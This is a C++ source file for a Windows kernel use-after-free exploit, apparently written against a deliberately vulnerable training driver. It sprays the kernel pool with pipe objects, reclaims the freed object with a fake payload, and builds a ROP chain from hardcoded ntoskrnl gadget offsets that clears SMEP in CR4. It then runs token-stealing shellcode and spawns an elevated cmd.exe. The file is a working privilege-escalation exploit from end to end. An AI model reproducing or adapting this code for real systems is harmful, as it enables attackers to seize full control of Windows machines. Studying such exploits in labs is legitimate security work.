#include "UAFExploit.hpp"

#include <vector>

std::vector<PIPE_HANDLES> pipes;

PIPE_HANDLES CreatePipeObject()
{
    DWORD ALLOC_SIZE = 0x70;
    BYTE uBuffer[0x28];				// ALLOC_SIZE - HEADER_SIZE (0x48)
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    DWORD dwRet;

    RtlFillMemory(uBuffer, 0x28, 0x41);
    if (!CreatePipe(&hReadPipe, &hWritePipe, NULL, sizeof(uBuffer))) 
    {
        Error("CreatePipe");
    }

    if (!WriteFile(hWritePipe, uBuffer, sizeof(uBuffer), &dwRet, NULL)) 
    {
        Error("WriteFile");
    }
    return PIPE_HANDLES{ hReadPipe, hWritePipe };
}

VOID SprayHeap() 
{
    
    for (int i = 0; i < SPRAY_NUM; i++)
    {
        PIPE_HANDLES pRet = CreatePipeObject();
        pipes.emplace_back(pRet);
    }

    for (int i = 0; i < SPRAY_NUM; i += 2)
    {
        CloseHandle(pipes[i].read);
        CloseHandle(pipes[i].write);
    }
}

VOID UAFExploit()
{
	DWORD dwRet;
	BYTE uPayload[0x60] = { 0 };
	HANDLE hFile = CreateFileW(
		TEXT(DEVICE_LINK_NAME),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		Error("open device");
	}
	printf("[*] Spray use write pipe\r\n");
	SprayHeap();

	printf("[*] Create UAF Object then free\r\n");
	DeviceIoControl(hFile, IOCTL_ALLOC, NULL, 0, NULL, 0, &dwRet, NULL);
	DebugBreak();
	DeviceIoControl(hFile, IOCTL_FREE, NULL, 0, NULL, 0, &dwRet, NULL);

	printf("[*] Prepare shellcode\r\n");
	LPVOID pShellcode = VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(pShellcode, StealToken, 0x100);

	ULONGLONG ntBase = GetBaseAddr(TEXT("ntoskrnl.exe"));
	ULONGLONG MOV_ESP_ADD_ESP = ntBase + 0x00000000002f3f90;
	ULONGLONG MOV_CR4_RCX = ntBase + 0x00000000003a0a87;
	ULONGLONG POP_RCX_RET = ntBase + 0x00000000002148c8;
	ULONGLONG STACK_PIVOT_ADDR = 0x48000000;
	ULONGLONG stackAddr = STACK_PIVOT_ADDR - 0x1000;

	LPVOID pKernelStack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!VirtualLock(pKernelStack, 0x14000)) {
		Error("VirtualLock");
	}

	RtlFillMemory((LPVOID)STACK_PIVOT_ADDR, 0x28, '\x90');
	ULONGLONG* ROP = (ULONGLONG*)((ULONGLONG)STACK_PIVOT_ADDR + 0x28);
	INT index = 0;
	*(ROP + index++) = POP_RCX_RET;
	*(ROP + index++) = 0x350ef8 ^ (3UL << 20);
	*(ROP + index++) = MOV_CR4_RCX;
	*(ROP + index++) = (ULONGLONG)pShellcode;

	*(ULONGLONG*)(uPayload) = (ULONGLONG)(MOV_ESP_ADD_ESP);
	*(ULONGLONG*)(uPayload + 8) = (ULONGLONG)(0xdeadbeef);
	printf("[*] Spray to get the UAF object then write shellcode\r\n");
	for (int i = 0; i < SPRAY_NUM; i += 2)
	{
		DeviceIoControl(hFile, IOCTL_ALLOC_FAKE, uPayload, sizeof(uPayload), NULL, 0, &dwRet, NULL);
	}
	DebugBreak();
	printf("[*] Trigger UAF callback\r\n");
	DeviceIoControl(hFile, IOCTL_USE, NULL, 0, NULL, 0, &dwRet, NULL);

	system("cmd.exe");
	CloseHandle(hFile);
	VirtualFree(pKernelStack, 0, MEM_RELEASE);
	VirtualFree(pShellcode, 0, MEM_RELEASE);
}

